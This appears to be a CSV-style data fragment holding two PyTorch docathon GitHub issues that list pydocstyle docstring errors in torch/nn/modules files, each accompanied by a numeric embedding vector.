 -0.2777334  -0.34887332 -0.07620562  0.13522659  0.07722874  0.17852966
  0.06591165 -0.02579539  0.28440914 -0.06843311  0.40992332  0.06899203
  0.3995061  -0.21021566  0.01014876  0.39479357  0.08522401  0.27060604
 -0.03505125  0.00967787 -0.09147897 -0.17912844  0.18414918 -0.48281947
 -0.17095122  0.08338685  0.03974569 -0.02280316  0.22646183  0.06415533
  0.13863567 -0.16089424  0.15048522 -0.06646238 -0.07243112  0.02358194
  0.2646218   0.08163668 -0.17719918 -0.00413826 -0.2518834   0.11226161
  0.14059699  0.21824177  0.03030782  0.05716885  0.10417593  0.00419638
  0.24407919  0.0051863   0.05594017 -0.05514726  0.1615081   0.14249246
 -0.2738168   0.17832917  0.31381404  0.1979786  -0.20166442 -0.2184032
  0.03281009 -0.06177169 -0.26207224 -0.38959384 -0.14452161 -0.27407253
  0.3524223   0.13287151 -0.40438348  0.31141827 -0.02245801  0.250553
  0.01648169  0.06687137 -0.28467485  0.5429783   0.02411416 -0.01493051
  0.35478485  0.13025764  0.03188526 -0.49051058 -0.0521253   0.15561149
 -0.00151878  0.09829631 -0.24313805  0.1187165  -0.31448257 -0.26290113
 -0.46381363 -0.16765754 -0.10779533  0.07250082 -0.00481284  0.01463521
  0.14489686  0.1101101   0.02524577 -0.21711594  0.01250897  0.34770188
  0.09786356  0.6292434   0.10441207  0.0485749  -0.14917922  0.24418095
  0.22325954 -0.17022981  0.1724459   0.24924539 -0.15183932 -0.28209484
  0.01496416  0.02616926 -0.05415648 -0.01410394  0.27975696  0.4764913
  0.02208995  0.3103385  -0.34180933  0.34446988  0.3109926  -0.10002201
  0.45505255 -0.05379812 -0.4797353  -0.30888426 -0.20573188  0.1273294
 -0.30588502 -0.12977351  0.0852928  -0.32025722 -0.18779638  0.35734934
  0.01400551 -0.30108884  0.35136032 -0.05328966 -0.30798924  0.00862863
 -0.12131365 -0.27234656  0.32841033  0.11925316 -0.02780634 -0.23808286
 -0.03738024 -0.08636986 -0.09948044 -0.1164045   0.43181968 -0.10574745
  0.07386293  0.20108624 -0.03600124 -0.12649383  0.20452876  0.3944686
 -0.25325024 -0.15743072 -0.01929745  0.01513281  0.10885738 -0.02464761
 -0.11994779  0.08139223 -0.40902176  0.0772837  -0.00466676 -0.37013745
  0.01436522 -0.08943348  0.56002086 -0.0113781  -0.19589618  0.04183521
 -0.09210755 -0.03983889  0.00445018  0.33885992 -0.19128029  0.15312599
  0.21617551 -0.24411546 -0.24764223  0.22602428 -0.2907011  -0.13937928
  0.22651193 -0.5441345   0.2968611   0.20085788  0.29592645 -0.08046495
  0.37114853 -0.0544333   0.11490718  0.0212189  -0.15644383  0.4262911
 -0.34496844  0.03989282  0.41380826 -0.15888572 -0.1884201  -0.11708639
 -0.46141148 -0.20678747 -0.23187497  0.15433744  0.21537478 -0.00596033
  0.01965696  0.18768199 -0.09926529  0.0756252   0.1539796   0.15980524
 -0.40722048 -0.11392312 -0.19187987  0.26136088  0.06967524  0.14912352
  0.04938462  0.13241759  0.18187702 -0.28742763  0.37586045  0.32692367
 -0.33635762  0.31454498 -0.01445518  0.07207939  0.00660264  0.46306747
  0.15379962  0.14878175 -0.11795948 -0.39704627 -0.26630294  0.06133174
 -0.09465121 -0.05222394 -0.59353316  0.14051792 -0.31212717 -0.10026544
  0.21521294  0.03017206 -0.06741379 -0.14361194 -0.082054   -0.0214817
 -0.11573115  0.21690556 -0.02930966 -0.25312325  0.00344308 -0.29121625
  0.12180878 -0.5097395  -0.07982326 -0.14697793  0.16315287  0.24721667
 -0.31894124 -0.42354602  0.47595537 -0.05641144 -0.42328683  0.06928105
 -0.25547138  0.52834564 -0.00988951  0.23898079 -0.02663585  0.38385987
 -0.5485449  -0.0221557  -0.17195421 -0.28657347 -0.04954146 -0.2970115
 -0.06181052 -0.01457161  0.2027319  -0.17867532 -0.37823582  0.12506367
 -0.21891573  0.2644096   0.40558904  0.10826401  0.02394158  0.06683874
  0.06006248 -0.34477836 -0.40598455  0.33512208  0.32894024 -0.12055412]"
"Fix docstring errors in pixelshuffle.py, sparse.py, rnn.py, pooling.py, upsampling.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelShuffle`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelShuffle`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelShuffle`, **Line**: 9, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelUnshuffle`, **Line**: 61, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelUnshuffle`, **Line**: 61, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pixelshuffle.py`, **Entity**: `PixelUnshuffle`, **Line**: 61, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool1d`, **Line**: 39, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool1d`, **Line**: 39, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool2d`, **Line**: 98, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool2d`, **Line**: 98, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool3d`, **Line**: 172, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `MaxPool3d`, **Line**: 172, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool1d`, **Line**: 498, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool1d`, **Line**: 498, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool2d`, **Line**: 565, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool2d`, **Line**: 565, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool2d`, **Line**: 565, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool3d`, **Line**: 644, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool3d`, **Line**: 644, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `AvgPool3d`, **Line**: 644, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `FractionalMaxPool2d`, **Line**: 736, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `FractionalMaxPool3d`, **Line**: 806, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `LPPool1d`, **Line**: 894, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `LPPool1d`, **Line**: 894, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `LPPool2d`, **Line**: 936, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/pooling.py`, **Entity**: `LPPool2d`, **Line**: 936, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `Embedding`, **Line**: 14, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `from_pretrained`, **Line**: 184, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `EmbeddingBag`, **Line**: 227, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `EmbeddingBag`, **Line**: 227, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `EmbeddingBag`, **Line**: 227, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/sparse.py`, **Entity**: `from_pretrained`, **Line**: 413, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `flatten_parameters`, **Line**: 149, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `RNN`, **Line**: 345, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `RNN`, **Line**: 345, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `LSTM`, **Line**: 565, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `LSTM`, **Line**: 565, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `GRU`, **Line**: 852, **Description**: 1 blank line required between summary line and description (found 2)
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `RNNCell`, **Line**: 1110, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/rnn.py`, **Entity**: `GRUCell`, **Line**: 1297, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `Upsample`, **Line**: 12, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingNearest2d`, **Line**: 175, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingNearest2d`, **Line**: 175, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingNearest2d`, **Line**: 175, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingBilinear2d`, **Line**: 220, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingBilinear2d`, **Line**: 220, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/upsampling.py`, **Entity**: `UpsamplingBilinear2d`, **Line**: 220, **Description**: First line should end with a period (not 't')

cc @carljparker",False,"[-2.08536923e-01 -2.45499596e-01 -5.01427725e-02 -1.38522252e-01
  1.57886326e-01 -5.22013083e-02 -5.64531125e-02  7.15807006e-02
 -3.07260245e-01  1.29785478e-01 -1.22486958e-02 -1.25810876e-02
  8.95244852e-02  6.94482923e-02 -1.33027539e-01 -2.67780032e-02
 -1.97848201e-01 -4.31530297e-01  1.20382242e-01  1.19974107e-01
  7.20239878e-02  4.02958900e-01 -9.14402753e-02  3.32489796e-02
  1.19965695e-01  8.95530954e-02 -3.17854851e-01 -1.97279453e-01
  3.70873734e-02 -5.94583191e-02  2.58656621e-01  2.07162738e-01
  7.38999248e-03 -3.12570147e-02  4.31240320e-01  3.01872313e-01
 -1.00365192e-01 -1.46515667e-01 -3.23442742e-02  1.53834522e-01
 -6.52791560e-03 -1.34044766e-01 -5.55739701e-02  2.70989053e-02
  1.37012810e-01 -1.89108476e-01 -2.01297462e-01  1.76186383e-01
 -2.51607336e-02  1.81707174e-01 -1.92945361e-01  6.82042167e-02
 -1.91028804e-01 -1.60153154e-02  2.17768818e-01  1.07692637e-01
 -2.07960680e-02  4.99816060e-01 -3.37283313e-02 -3.28406617e-02
  1.53037608e-02  1.49566472e-01 -7.23796487e-02  1.08612016e-01
  7.07493871e-02  3.21519613e-01  2.24769823e-02  1.86940283e-01
  2.27067098e-01  1.32516369e-01 -1.84997290e-01  8.44006091e-02
 -4.52219516e-01 -1.38080031e-01  3.58171463e-02  3.42775702e-01
 -3.98925364e-01  2.29736678e-02 -2.10370481e-01 -3.26286703e-01
 -1.87638223e-01  7.26501644e-03 -2.23825481e-02  1.69541284e-01
  6.13776036e-04 -9.16365981e-02  1.98610604e-01 -9.89135951e-02
  2.55018234e-01  9.74685699e-02  3.39489490e-01 -5.77060618e-02
 -1.80593967e-01  4.27157402e-01  7.82937780e-02  1.88259035e-01
 -1.74939498e-01 -1.18247069e-01  6.96645528e-02 -6.72284812e-02
 -1.91180315e-03 -2.67315567e-01 -1.30169496e-01  1.49988562e-01
 -1.45488810e-02 -1.85066223e-01  1.11901358e-01 -5.50913811e-03
  1.16300002e-01 -3.79319303e-03  1.06899180e-01 -7.85112977e-02
  1.27448052e-01  1.51316255e-01  3.51565599e-01 -3.72906774e-02
  4.11435291e-02 -7.47760711e-03 -3.15417647e-01 -4.46588397e-02
  2.00773776e-01  1.93253577e-01 -1.45715266e-01  3.32820490e-02
  4.96260710e-02  5.74126765e-02  1.62493706e-01 -2.12258175e-02
  2.25819811e-01 -2.19749898e-01  1.05616152e-01 -1.15631521e-02
 -1.42900765e-01  5.01367189e-02  2.63749421e-01  7.03606904e-02
 -1.15086406e-01 -2.59098262e-01  3.55794504e-02 -5.52937500e-02
 -2.11926594e-01 -4.35575843e-01 -2.34821692e-01 -2.88126767e-01
  2.10886866e-01  3.77395302e-01 -4.64198887e-01  4.02884245e-01
  5.87862171e-02  1.24683641e-01 -1.87958896e-01  5.90444952e-02
 -3.28152895e-01  3.66197377e-01 -9.11941286e-03 -1.23915421e-02
  3.41519713e-01  1.43658638e-01 -1.52185768e-01 -2.76223749e-01
 -8.82839486e-02  2.90332027e-02 -6.48014173e-02 -1.17925987e-01
 -1.84732407e-01  1.82828665e-01 -1.35337502e-01 -8.91807377e-02
 -2.92646527e-01 -1.32778838e-01  5.84039502e-02  8.82961750e-02
  1.26726907e-02 -3.42912972e-03  3.05954814e-01  8.97190571e-02
 -1.17893815e-01 -2.88436323e-01  1.89825848e-01  1.45190895e-01
  9.39770192e-02  5.13547778e-01  1.41111925e-01  2.25225054e-02
 -1.69635862e-01 -2.00024452e-02  1.73632473e-01 -7.66822742e-03
  9.34370756e-02  4.79621679e-01  3.10529843e-02 -2.62647808e-01
  8.67775902e-02  3.46855074e-02 -2.87155397e-02  3.39180902e-02
  1.70448095e-01  4.26891297e-01  1.64622143e-02  2.19736069e-01
 -2.70641029e-01  1.91350967e-01  2.92668402e-01 -8.39011520e-02
  4.37479138e-01 -9.17270035e-02 -4.12942648e-01 -3.01200867e-01
 -1.70044988e-01  1.46421179e-01 -3.44948143e-01 -2.26460010e-01
 -7.15051144e-02 -1.94690317e-01 -2.26762235e-01  3.40782523e-01
  4.56769131e-02 -3.71285498e-01  1.39741242e-01 -6.38462156e-02
 -3.27576458e-01 -1.09871000e-01 -1.76459670e-01 -2.77444333e-01
  2.83262640e-01 -2.48102192e-02 -1.12808809e-01 -5.01113851e-03
 -1.29072309e-01  3.57924476e-02  7.60915056e-02  3.24378535e-02
  5.54754615e-01 -3.10596645e-01  1.22214235e-01  1.53321385e-01
 -1.42021745e-01 -1.19117033e-02  7.59908333e-02  3.08382988e-01
 -1.71177760e-01 -7.41214603e-02 -9.59582031e-02  4.90397066e-02
  1.26884788e-01 -2.18837082e-01 -5.86852878e-02  1.51887070e-02
 -2.10411876e-01  2.48946279e-01 -1.20699778e-01 -2.52784163e-01
  1.26183257e-01 -5.21063954e-02  5.17218113e-01 -1.31932676e-01
 -3.01384658e-01 -1.16862595e-01 -1.42206782e-02  1.60090327e-01
  1.55200511e-02  2.45133251e-01 -6.56432062e-02  2.53733516e-01
  2.02927172e-01 -2.56242633e-01 -1.92196965e-01  1.96923479e-01
 -2.52224579e-02 -1.13260671e-01  2.10272044e-01 -4.05663133e-01
  1.72566801e-01  2.37958550e-01  2.77091384e-01  1.47432700e-01
  3.38908851e-01  1.34223074e-01 -1.03378519e-01 -4.20053676e-03
 -2.54180372e-01  4.97921258e-01 -3.36060941e-01  7.72627257e-03
  2.77461261e-01 -1.27691686e-01 -2.95144826e-01 -3.04952830e-01
 -4.57972825e-01 -1.87486768e-01 -6.95009828e-02  1.15852803e-01
  3.81843269e-01  7.57271200e-02  2.34762728e-02  1.56366795e-01
  1.28167108e-01  1.54989958e-01  2.63422132e-01  1.72866821e-01
 -4.35511082e-01 -2.57233754e-02 -1.10315785e-01  3.19812834e-01
  2.06690747e-02  3.19721848e-01  7.27055743e-02  1.02145076e-01
  8.95803422e-02 -2.16066569e-01  3.17249417e-01  3.51949751e-01
 -2.14123681e-01  2.22054243e-01 -1.86866656e-01  2.08939761e-02
  1.92783609e-01  5.13394713e-01  1.46621153e-01  2.69551054e-02
 -7.35586211e-02 -3.56357753e-01 -1.91942289e-01  2.80876178e-02
  1.77912135e-02 -1.09489329e-01 -4.52339530e-01  3.89845707e-02
 -2.51066446e-01 -4.12892252e-01  2.33250052e-01 -6.83717951e-02
 -1.87070325e-01 -1.08686864e-01 -1.66633036e-02 -6.35213852e-02
 -1.89749710e-03  2.01899976e-01 -9.50236320e-02 -2.61067331e-01
 -1.14321366e-01 -1.87039912e-01  7.26206079e-02 -5.86170077e-01
 -1.19707696e-01  4.38606329e-02  1.20159030e-01  1.32648587e-01
 -3.46783340e-01 -3.72206122e-01  5.07896721e-01 -1.74132735e-02
 -2.51873910e-01  4.63821143e-02 -1.23845674e-01  5.19003987e-01
 -9.82350856e-02  3.32833499e-01 -1.16732858e-01  2.77234375e-01
 -6.26974702e-01 -1.50517136e-01 -1.44470721e-01 -2.81724334e-01
 -1.68703735e-01 -2.99440503e-01 -6.71276897e-02 -7.19828978e-02
  2.25466937e-01 -2.78891027e-02 -1.95400834e-01  1.85309440e-01
 -2.04887062e-01  4.25199151e-01  3.55091840e-01  1.79082960e-01
  2.00271577e-01 -2.57988889e-02  6.85624182e-02 -2.52791733e-01
 -5.23840785e-01  3.59052658e-01  2.78772533e-01 -5.75480610e-02]"
"Fix docstring errors in padding.py, distance.py, dropout.py, adaptive.py, linear.py, flatten.py, lazy.py, instancenorm.py, fold.py, normalization.py, channelshuffle.py, conv.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `AdaptiveLogSoftmaxWithLoss`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `AdaptiveLogSoftmaxWithLoss`, **Line**: 20, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `_get_full_log_prob`, **Line**: 245, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `log_prob`, **Line**: 263, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `log_prob`, **Line**: 263, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `log_prob`, **Line**: 263, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `log_prob`, **Line**: 263, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/adaptive.py`, **Entity**: `predict`, **Line**: 283, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/modules/channelshuffle.py`, **Entity**: `ChannelShuffle`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/channelshuffle.py`, **Entity**: `ChannelShuffle`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/channelshuffle.py`, **Entity**: `ChannelShuffle`, **Line**: 9, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv1d`, **Line**: 1196, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv1d`, **Line**: 1196, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv2d`, **Line**: 1265, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv2d`, **Line**: 1265, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv3d`, **Line**: 1334, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConv3d`, **Line**: 1334, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose1d`, **Line**: 1403, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose1d`, **Line**: 1403, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose2d`, **Line**: 1471, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose2d`, **Line**: 1471, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose3d`, **Line**: 1539, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/conv.py`, **Entity**: `LazyConvTranspose3d`, **Line**: 1539, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/distance.py`, **Entity**: `PairwiseDistance`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/distance.py`, **Entity**: `CosineSimilarity`, **Line**: 57, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout`, **Line**: 26, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout`, **Line**: 26, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout1d`, **Line**: 63, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout1d`, **Line**: 63, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout2d`, **Line**: 105, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout2d`, **Line**: 105, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout3d`, **Line**: 154, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `Dropout3d`, **Line**: 154, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `FeatureAlphaDropout`, **Line**: 238, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/dropout.py`, **Entity**: `FeatureAlphaDropout`, **Line**: 238, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/modules/flatten.py`, **Entity**: `Flatten`, **Line**: 10, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/flatten.py`, **Entity**: `Flatten`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/flatten.py`, **Entity**: `Unflatten`, **Line**: 56, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/fold.py`, **Entity**: `Fold`, **Line**: 11, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/fold.py`, **Entity**: `Fold`, **Line**: 11, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/fold.py`, **Entity**: `Fold`, **Line**: 11, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/modules/fold.py`, **Entity**: `Unfold`, **Line**: 157, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm1d`, **Line**: 91, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm1d`, **Line**: 91, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm1d`, **Line**: 167, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm1d`, **Line**: 167, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm2d`, **Line**: 206, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm2d`, **Line**: 206, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm2d`, **Line**: 283, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm2d`, **Line**: 283, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm3d`, **Line**: 322, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `InstanceNorm3d`, **Line**: 322, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm3d`, **Line**: 399, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/instancenorm.py`, **Entity**: `LazyInstanceNorm3d`, **Line**: 399, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_LazyProtocol`, **Line**: 11, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_LazyProtocol`, **Line**: 11, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_LazyProtocol`, **Line**: 11, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `LazyModuleMixin`, **Line**: 54, **Description**: First line should end with a period (not '""')
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `initialize_parameters`, **Line**: 222, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `has_uninitialized_params`, **Line**: 229, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `has_uninitialized_params`, **Line**: 229, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_infer_parameters`, **Line**: 241, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/lazy.py`, **Entity**: `_infer_parameters`, **Line**: 241, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Identity`, **Line**: 22, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Linear`, **Line**: 49, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Linear`, **Line**: 49, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Bilinear`, **Line**: 135, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Bilinear`, **Line**: 135, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/linear.py`, **Entity**: `Bilinear`, **Line**: 135, **Description**: First line should end with a period (not '
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LocalResponseNorm`, **Line**: 15, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LocalResponseNorm`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LocalResponseNorm`, **Line**: 15, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/modules/normalization.py`, **Entity**: `LayerNorm`, **Line**: 88, **Description**: 1 blank line required after class docstring (found 0)
